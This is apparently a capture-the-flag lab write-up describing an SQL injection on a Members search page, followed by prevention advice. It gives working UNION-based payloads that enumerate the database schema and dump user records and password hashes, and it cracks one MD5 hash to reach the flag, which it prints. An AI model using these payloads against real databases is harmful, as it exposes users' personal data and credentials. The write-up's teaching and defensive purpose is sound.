# SQL Injection: Members Page Vulnerability

## Overview

A SQL Injection vulnerability found on the Members page allows attackers to exploit weak input validation and extract sensitive data.

---

## Discovery & Exploitation

### 1. Confirm the Vulnerability
- i.e. input in search: `1' OR TRUE`
- Result: With single quote did not work. After trying different SQL Payloads

- Input in search: `1 OR TRUE`
- Result: Returns all members, confirming SQL injection.

### 2. Extract DB and Table Info
- Query: `-1 union select database(), user()`
- Result: Reveals DB name and user.

- Query: `-1 UNION SELECT 1,table_name FROM information_schema.tables `
- Result: Reveals all Table names

### 3. Enumerate Structure
- Query: `-1 UNION SELECT table_name, column_name FROM information_schema.columns`
- Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)

### 4. Dump User Data
- Query: `-1 UNION SELECT concat(Commentaire, countersign), concat(user_id,first_name,last_name, country,town,planet) FROM users --`
- Result: Exposes sensitive data, including password hashes and hints.

### 5. Crack the Flag
- Extract hash: `5ff9d0165b4f92b14994e5c685cdce28`
- MD5 decrypt: `FortyTwo` (use [dcode.fr](https://www.dcode.fr/md5-hash) or [crackstation.net](https://crackstation.net) to decode MD5)
- Lowercase: `fortytwo`
- Get SHA-256:
    ```bash
    echo -n 'fortytwo' | sha256sum
    ```
- Flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## Prevention

1. **Parameterized Queries**
    ```php
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->bind_param("i", $user_id);
    ```
2. **Input Validation**
    ```php
    if (!is_numeric($user_id)) { exit("Invalid input"); }
    ```
3. **Database Security**
    - Use least-privilege DB accounts
    - Hide error messages
    - Monitor activity

4. **Web Application Firewall**
    - Deploy a WAF to block common attacks

5. **Regular Security Testing**
    - Run frequent scans and penetration tests

---

> Weak input validation can lead to full data exposure. Always use secure coding practices to protect your applications.